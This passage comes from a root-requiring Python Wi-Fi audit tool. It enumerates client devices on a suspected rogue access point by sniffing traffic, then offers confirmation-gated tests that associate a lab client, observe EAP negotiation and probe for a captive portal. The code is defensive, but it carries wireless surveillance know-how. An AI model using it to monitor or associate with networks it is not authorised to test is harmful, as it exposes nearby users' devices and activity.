            try:
                audit.set_view("clients")
            except Exception:
                pass
            UI.info(f"Enumerating connected clients on rogue AP {rogue_bssid}... Press Ctrl+C to stop and show connected clients.")
            # Snapshot pre-existing victims so we can report who newly appeared
            # during this window (possible auto-association — observational only).
            try:
                _rb0 = rogue_bssid.lower()
                known_before = {str(r[2]).lower() for r in
                                (getattr(audit, "client_results", []) or [])
                                if len(r) > 2 and str(r[0]).lower() == _rb0}
            except Exception:
                known_before = set()
            stop_v = threading.Event()
            sniff_v = threading.Thread(
                target=sniff,
                kwargs=dict(
                    iface=iface,
                    prn=lambda pkt: audit.data_frames(pkt, rogue_bssid, iface, rogue_ch),
                    store=0,
                    stop_filter=lambda _pkt: stop_v.is_set(),
                ),
                daemon=True,
            )
            sniff_v.start()
            try:
                sniff_v.join()
            except KeyboardInterrupt:
                stop_v.set()
                sniff_v.join()
            finally:
                audit.stop_hopper.set()

            print()
            victims = []
            try:
                rb = rogue_bssid.lower()
                for row in getattr(audit, "client_results", []) or []:
                    try:
                        if str(row[0]).lower() == rb:
                            victims.append(row)
                    except Exception:
                        continue
            except Exception:
                victims = []
            if not victims:
                UI.warn(f"No victims seen on rogue {rogue_bssid} yet.")
                UI.info("Clients only appear with traffic — keep listening longer while victims use the network.")
                audit.stop_hopper.set()
                continue
            UI.section(f"Connected Clients — Rogue AP {rogue_ssid} ({rogue_bssid})")
            UI.info("Enumerating connected clients on the rogue AP — same view as option 2.")
            from tabulate import tabulate
            vrows = []
            for row in victims:
                try:
                    _ap, _apv, cli, cliv, st = row[0], row[1], row[2], row[3], row[4]
                    rssi_s = row[5] if len(row) > 5 else "?"
                    first_s = row[6] if len(row) > 6 else "?"
                    last_s = row[7] if len(row) > 7 else "?"
                    try:
                        hs_s = audit._hs_label(audit.client_handshake.get(cli, {}))
                    except Exception:
                        hs_s = "--"
                    color = UI.GREEN if st == "Connected" else UI.RED
                    vrows.append([
                        f"{UI.GREEN}{_ap}{UI.RESET}",
                        f"{UI.GREEN}{_apv}{UI.RESET}",
                        f"{UI.GREEN}{cli}{UI.RESET}",
                        f"{UI.GREEN}{cliv}{UI.RESET}",
                        f"{color}{st}{UI.RESET}",
                        f"{UI.DIM}{rssi_s}{UI.RESET}",
                        f"{UI.DIM}{first_s}{UI.RESET}",
                        f"{UI.DIM}{last_s}{UI.RESET}",
                        f"{UI.DIM}{hs_s}{UI.RESET}",
                    ])
                except Exception:
                    continue
            print(tabulate(vrows, headers=["Access Point", "AP Vendor", "Connected Client", "Client Vendor", "Status", "RSSI", "First Seen", "Last Seen", "HS/EAP"], tablefmt="pretty"))
            UI.ok(f"{len(vrows)} connected client(s) enumerated on rogue AP {rogue_bssid}.")
            try:
                new_during_window = [r for r in victims
                                     if str(r[2]).lower() not in known_before]
                if new_during_window:
                    UI.warn(f"{len(new_during_window)} client(s) newly observed on the rogue AP "
                            f"during this window — possible auto-association. Verify each against "
                            f"the approved device list before concluding anything.")
            except Exception:
                pass

            # ── Optional controlled auto-association test (ACTIVE) ──────
            # Never automatic: requires an explicit test interface plus typed
            # confirmation, targets ONLY the selected rogue, and disconnects after.
            try:
                want = input(f"{UI.BOLD}  ❯ Run controlled auto-association test with a lab client? [y/N]: {UI.RESET}").strip().lower()
            except (KeyboardInterrupt, EOFError):
                want = "n"
                print()
            if want in ("y", "yes"):
                UI.warn("[ACTIVE] This associates YOUR test client to the suspect AP. Lab use only.")
                try:
                    test_if = input(f"{UI.BOLD}  ❯ Test client interface (must be managed, NOT {iface}): {UI.RESET}").strip()
                    if not test_if:
                        raise ValueError("empty")
                    if test_if == iface:
                        UI.error("Refusing: test interface must differ from the monitor interface.")
                    elif not Path(f"/sys/class/net/{test_if}").exists():
                        UI.error(f"Interface {test_if} not found.")
                    else:
                        confirm = input(f"{UI.BOLD}  ❯ Type the rogue BSSID to AUTHORIZE ({rogue_bssid}): {UI.RESET}").strip()
                        if confirm.lower() != rogue_bssid.lower():
                            UI.info("Association test aborted — nothing was transmitted.")
                        elif any(k in str(chosen[4]).lower() for k in ("802.1x", "eap", "enterprise")):
                            # Enterprise targets: never auto-connect (no credentials are
                            # collected). Instead, observe EAP negotiation — the operator
                            # connects their own provisioned lab client manually.
                            UI.info("Enterprise-secured suspect: skipping auto-connect (no credentials "
                                    "handled). Starting 30s EAP-negotiation observation instead — "
                                    "connect your provisioned lab client now, or Ctrl+C to stop.")
                            try:
                                audit.set_view("clients")
                            except Exception:
                                pass
                            stop_eap = threading.Event()
                            sniff_eap = threading.Thread(
                                target=sniff,
                                kwargs=dict(
                                    iface=iface,
                                    prn=lambda pkt: audit.data_frames(pkt, rogue_bssid, iface, rogue_ch),
                                    store=0,
                                    stop_filter=lambda _pkt: stop_eap.is_set(),
                                ),
                                daemon=True,
                            )
                            sniff_eap.start()
                            try:
                                sniff_eap.join(timeout=30)
                            except KeyboardInterrupt:
                                print()
                            finally:
                                stop_eap.set()
                                sniff_eap.join()
                            try:
                                seen_eap: dict = {}
                                for _mac, _st in (getattr(audit, "client_handshake", {}) or {}).items():
                                    if _st.get("eap"):
                                        seen_eap[_mac] = sorted(_st["eap"])
                                if seen_eap:
                                    UI.ok(f"EAP negotiation observed for {len(seen_eap)} client(s):")
                                    for _mac, _methods in list(seen_eap.items())[:10]:
                                        print(f"  {_mac}: {', '.join(_methods)}")
                                else:
                                    UI.warn("No EAP exchanges observed in this window.")
                                UI.info("Certificate-validation checklist for managed clients: enforce server-"
                                        "certificate validation + expected server names, prefer EAP-TLS, "
                                        "never accept 'do not validate' profiles.")
                            except Exception:
                                pass
                        else:
                            UI.info(f"Associating {test_if} → SSID '{rogue_ssid}' for up to 15s...")
                            associated = False
                            try:
                                subprocess.run(["iw", "dev", test_if, "connect", rogue_ssid],
                                               capture_output=True, text=True, timeout=20)
                                import time as _t
                                _t.sleep(3)
                                link = subprocess.run(["iw", "dev", test_if, "link"],
                                                      capture_output=True, text=True, timeout=10)
                                out = (link.stdout or "")
                                if "Connected to" in out or rogue_bssid.lower() in out.lower():
                                    associated = True
                                    UI.warn(f"Test client ASSOCIATED (auto-association works against this "
                                            f"impersonated SSID). Output:\n{out[:800]}")
                                else:
                                    UI.ok("Test client did NOT associate within the window.")
                            except subprocess.TimeoutExpired:
                                UI.warn("Association attempt timed out — treating as not associated.")
                            except FileNotFoundError:
                                UI.error("'iw' not found — cannot run the association test.")
                            except Exception as e:
                                UI.error(f"Association test failed safely: {e}")
                            finally:
                                # Optional captive-portal behavior probe on the fresh
                                # association only: fetch the gateway web root, report
                                # portal-like behavior. No credentials are entered.
                                if associated:
                                    try:
                                        _pb = input(f"{UI.BOLD}  ❯ Probe gateway HTTP for captive-portal behavior? [y/N]: {UI.RESET}").strip().lower()
                                    except (KeyboardInterrupt, EOFError):
                                        _pb = "n"
                                        print()
                                    if _pb in ("y", "yes"):
                                        try:
                                            _gw = None
                                            _rt = subprocess.run(["ip", "route", "show", "dev", test_if],
                                                                 capture_output=True, text=True, timeout=10)
                                            import re as _re2
                                            _m = _re2.search(r"default via (\S+)", _rt.stdout or "")
                                            _gw = _m.group(1) if _m else None
                                            import urllib.request as _url
                                            _target = f"http://{_gw}/" if _gw else "http://detectportal.firefox.com/canonical.html"
                                            UI.info(f"Fetching {_target} (8s timeout, no credentials)...")
                                            _req = _url.Request(_target, headers={"User-Agent": "wpf-audit-lab"})
                                            with _url.urlopen(_req, timeout=8) as _resp:
                                                _body = _resp.read(4096).decode("utf-8", "replace")
                                                _title = _re2.search(r"<title>(.*?)</title>", _body,
                                                                     _re2.I | _re2.S)
                                                UI.warn(f"HTTP {_resp.status} from {_target} — "
                                                        f"title: {(_title.group(1).strip()[:80] if _title else '?')}. "
                                                        f"Compare with the legitimate network's expected portal/gateway.")
                                        except Exception as e:
                                            UI.warn(f"Portal probe inconclusive: {e}")
                                try:
                                    subprocess.run(["iw", "dev", test_if, "disconnect"],
                                                   capture_output=True, timeout=10)
                                    UI.info(f"Test client {test_if} disconnected (cleanup).")
                                except Exception:
                                    pass
                except (KeyboardInterrupt, EOFError, ValueError):
                    print()
                    UI.info("Association test cancelled — nothing was transmitted.")
            audit.stop_hopper.set()
            continue

        else:
            print()
            UI.info("User chose something else.")
            audit.stop_hopper.set()
            continue  # back to menu for unimplemented options

        # ── Per-iteration hopper teardown ──────────────────────────────────
        # Reached when sniff() returns on its own (e.g. option 3's timeout
        # expires naturally with no Ctrl+C).  Stop the hopper and loop back
        # to the menu so the user can choose their next action.
        audit.stop_hopper.set()
        continue  # back to top of while loop → show menu again

    # ── Final cleanup — runs once when the loop exits (user chose 0 / Exit) ──
    audit.stop_hopper.set()  # safety: ensure hopper is stopped
    UI.divider()
    UI.info("Cleaning up and restoring services...")
    subprocess.run(["systemctl", "start", "NetworkManager"], capture_output=True)
    # start the wpa_supplicant as well
    subprocess.run(["systemctl", "start", "wpa_supplicant"], capture_output=True)
    InterfaceManager.set_state(iface, "down")
    InterfaceManager.set_mode(iface, 2)  # Managed
    UI.ok("Interface restored to Managed mode. Shutdown complete.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{UI.RED}[!] Error: This tool requires root privileges (sudo).{UI.RESET}")
        sys.exit(1)
    main()
